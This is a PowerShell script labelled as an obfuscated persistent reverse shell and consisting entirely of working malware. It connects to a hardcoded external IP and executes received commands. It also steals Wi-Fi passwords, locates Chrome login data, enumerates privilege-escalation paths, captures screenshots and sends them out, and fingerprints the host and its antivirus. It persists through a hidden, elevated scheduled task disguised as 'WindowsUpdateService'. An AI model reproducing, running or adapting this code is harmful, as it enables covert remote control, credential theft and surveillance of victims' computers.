# reverse_shell.ps1 - Obfuscated persistent reverse shell
${_} = "147.185.221.31"; ${__} = 47034; ${___} = 15; ${____} = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

function ${______} {
    ${_____} = $env:COMPUTERNAME; ${_______} = $env:USERNAME
    ${________} = (Get-WmiObject Win32_OperatingSystem).Caption
    ${_________} = (Get-WmiObject Win32_ComputerSystem).Domain
    ${__________} = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    ${___________} = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
    return "SYSINFO:${_____}|${_______}|${________}|${_________}|${__________}|${___________}"
}

function ${____________} {
    ${_____________} = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    ${______________} = @()
    
    foreach (${_______________} in ${_____________}) {
        ${________________} = netsh wlan show profile name="${_______________}" key=clear
        ${_________________} = (${________________} | Select-String "Key Content").ToString().Split(":")[1].Trim()
        ${______________} += "WIFI:${_______________}|${_________________}"
    }
    
    return ${______________} -join "`n"
}

function ${__________________} {
    ${___________________} = @()
    
    try {
        ${____________________} = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path ${____________________}) {
            ${___________________} += "CHROME:Credentials found at ${____________________} (decryption required)"
        }
    } catch { }

    return ${___________________} -join "`n"
}

function ${_____________________} {
    ${______________________} = @()
    
    ${_______________________} = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
    foreach (${________________________} in ${_______________________}) {
        ${______________________} += "PRIVESC:Unquoted service path - $(${________________________}.Name): $(${________________________}.PathName)"
    }
    
    ${_________________________} = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if (${_________________________} -eq 1) {
        ${______________________} += "PRIVESC:AlwaysInstallElevated enabled"
    }
    
    return ${______________________} -join "`n"
}

function ${__________________________} {
    try {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination ${____} -Force
        
        ${___________________________} = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"${____}`""
        ${____________________________} = New-ScheduledTaskTrigger -AtLogOn
        ${_____________________________} = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
        ${______________________________} = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        ${_______________________________} = New-ScheduledTask -Action ${___________________________} -Trigger ${____________________________} -Principal ${_____________________________} -Settings ${______________________________}
        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject ${_______________________________} -Force
        
        return "PERSISTENCE:Scheduled task created successfully"
    } catch {
        return "PERSISTENCE:Error - $($_.Exception.Message)"
    }
}

function ${________________________________} {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        ${_________________________________} = [System.Windows.Forms.SystemInformation]::VirtualScreen
        ${__________________________________} = New-Object System.Drawing.Bitmap ${_________________________________}.Width, ${_________________________________}.Height
        ${___________________________________} = [System.Drawing.Graphics]::FromImage(${__________________________________})
        ${___________________________________}.CopyFromScreen(${_________________________________}.X, ${_________________________________}.Y, 0, 0, ${__________________________________}.Size)
        
        ${____________________________________} = New-Object System.IO.MemoryStream
        ${__________________________________}.Save(${____________________________________}, [System.Drawing.Imaging.ImageFormat]::Png)
        ${_____________________________________} = ${____________________________________}.ToArray()
        ${______________________________________} = [Convert]::ToBase64String(${_____________________________________})
        
        ${___________________________________}.Dispose()
        ${__________________________________}.Dispose()
        ${____________________________________}.Dispose()
        
        return "SCREENSHOT:${______________________________________}"
    } catch {
        return "SCREENSHOT:Error - $($_.Exception.Message)"
    }
}

function ${_______________________________________} {
    param(${________________________________________})
    
    switch -Regex (${________________________________________}) {
        "^!wifi" { return ${____________} }
        "^!browsers" { return ${__________________} }
        "^!privesc" { return ${_____________________} }
        "^!persist" { return ${__________________________} }
        "^!screenshot" { return ${________________________________} }
        "^!sysinfo" { return ${______} }
        default { return "ERROR:Unknown special command" }
    }
}

while ($true) {
    try {
        ${_________________________________________} = New-Object System.Net.Sockets.TCPClient
        ${_________________________________________}.Connect(${_}, ${__})
        
        ${__________________________________________} = ${_________________________________________}.GetStream()
        ${___________________________________________} = New-Object System.IO.StreamWriter(${__________________________________________})
        ${___________________________________________}.AutoFlush = $true
        ${____________________________________________} = New-Object System.IO.StreamReader(${__________________________________________})
        
        ${___________________________________________}.WriteLine((${______}))
        
        while ($true) {
            try {
                ${_____________________________________________} = ${____________________________________________}.ReadLine()
                if (-not ${_____________________________________________}) { break }
                
                if (${_____________________________________________} -eq "exit") { break }
                
                if (${_____________________________________________} -match "^!") {
                    ${______________________________________________} = ${_______________________________________} ${_____________________________________________}
                    ${___________________________________________}.WriteLine(${______________________________________________})
                    continue
                }
                
                ${_______________________________________________} = iex ${_____________________________________________} 2>&1 | Out-String
                ${___________________________________________}.WriteLine(${_______________________________________________})
            }
            catch {
                ${________________________________________________} = "ERROR: $($_.Exception.Message)`n"
                ${___________________________________________}.WriteLine(${________________________________________________})
            }
        }
    }
    catch {
    }
    finally {
        if (${_________________________________________}) { ${_________________________________________}.Close() }
    }
    
    Start-Sleep -Seconds ${___}
}
